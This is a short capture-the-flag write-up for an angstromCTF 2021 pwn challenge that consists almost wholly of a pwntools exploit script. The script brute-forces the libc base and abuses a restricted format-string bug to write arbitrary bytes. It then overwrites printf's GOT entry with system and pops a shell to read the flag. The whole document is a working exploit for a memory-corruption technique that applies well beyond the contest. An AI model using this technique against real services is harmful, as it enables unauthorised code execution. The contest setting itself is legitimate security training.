​This challenge was a very restricted format string.

Nobodyisnobody for RootMeUpBeforeYouGoGo

```python
from pwn import *

context.log_level = 'error'

host, port = "pwn.2021.chall.actf.co", "21800"

printf_got = 0x404030
user_buff = 0x4040E0

def tohex(val, nbits):
  return hex((val + (1 << nbits)) % (1 << nbits))

# first we bruteforce libc_base to have (mask 0xf000)  to zero, to be able to change printf to system
while True:
  p = remote(host, port)
  p.sendlineafter('stonks!\n', '1')
  # put ret_main address value on stack (reachable at offset 73 from fsb)
  p.sendlineafter('see?\n', '73')
  # overwrite _ret_main_address to return to main & dump a libc address at the same time
  payload = 'y'*120+'%73$hhn'+'%*\n'*2
  payload += (300-len(payload))*'y'
  p.sendlineafter('token?\n', payload)
  p.readuntil('%')
  leak = int(p.readuntil('\n', drop=True),10) - 0x1e4743
  print('libc base = '+tohex(leak, 32))
  if (leak & 0xf000):
   print('libc base NOT GOOD continuing bruteforce...')
   p.close()
  else:
   break

print('libc base is GOOD continuing with fsb kungfu...(be patient)..')

# various primitives we need to write address with fsb
def writeaddress(address):
  p.sendlineafter('stonks!\n', '1')
  p.sendlineafter('see?\n', '73')
  payload = 'y'*120+ '%73$hhn' + '%'+str(address-120)+'c' + '%52$n'+'yzyz'
  p.sendlineafter('token?\n', payload)
  p.recvuntil('yzyz',drop=True)

def writewordaddress(address):
  p.sendlineafter('stonks!\n', '1')
  p.sendlineafter('see?\n', '73')
  payload = 'y'*120+ '%73$hhn' + '%'+str(address-120)+'c' + '%52$hn'+'yzyz'
  p.sendlineafter('token?\n', payload)
  p.recvuntil('yzyz',drop=True)

def writebyteaddress(val):
  p.sendlineafter('stonks!\n', '1')
  p.sendlineafter('see?\n', '73')
  if (val>120):
    payload = 'y'*120+ '%73$hhn' + '%'+str(val-120)+'c' + '%52$hhnyz'
  else:
    payload = 'y'*120+ '%73$hhn' + '%'+str(val+136)+'c' + '%52$hhnyz'
  p.sendlineafter('token?\n', payload)
  p.recvuntil('yz',drop=True)

def writebyte(val):
  p.sendlineafter('stonks!\n', '1')
  p.sendlineafter('see?\n', '73')
  if (val>120):
    payload = 'y'*120+ '%73$hhn' + '%'+str(val-120)+'c' + '%54$hhnyz'
  else:
    payload = 'y'*120+ '%73$hhn' + '%'+str(val+136)+'c' + '%54$hhnyz'
  p.sendlineafter('token?\n', payload)
  p.recvuntil('yz',drop=True)

def writeword(val):
  p.sendlineafter('stonks!\n', '1')
  p.sendlineafter('see?\n', '73')
  if (val>120):
    payload = 'y'*120+ '%73$hhn' + '%'+str(val-120)+'c' + '%54$hnyz'
  else:
    payload = 'y'*120+ '%73$hhn' + '%'+str(val+136)+'c' + '%54$hnyz'
  p.sendlineafter('token?\n', payload)
  p.recvuntil('yz',drop=True)

# first we write ';sh' just after user buffer
writeaddress(user_buff+300)
print('writing 1st byte')
writebyte(ord(';'))
writebyteaddress(0x0d)
print('writing 2nd byte')
writebyte(ord('s'))
writebyteaddress(0x0e)
print('writing 3rd byte')
writebyte(ord('h'))
writewordaddress(printf_got & 0xffff)

# system low address 
low = leak + 0x503c0
# overwrite printf got with system address
print('overwriting printf got')
writeword(low & 0xffff)

# send 300*'A' will be followed by ';sh' to system
p.sendlineafter('stonks!\n', '1')
p.sendlineafter('see?\n', '73')
p.sendafter('token?\n', 'y'*300)
# we got shell
p.sendline('id')
p.sendline('cat flag*')

p.interactive()

```

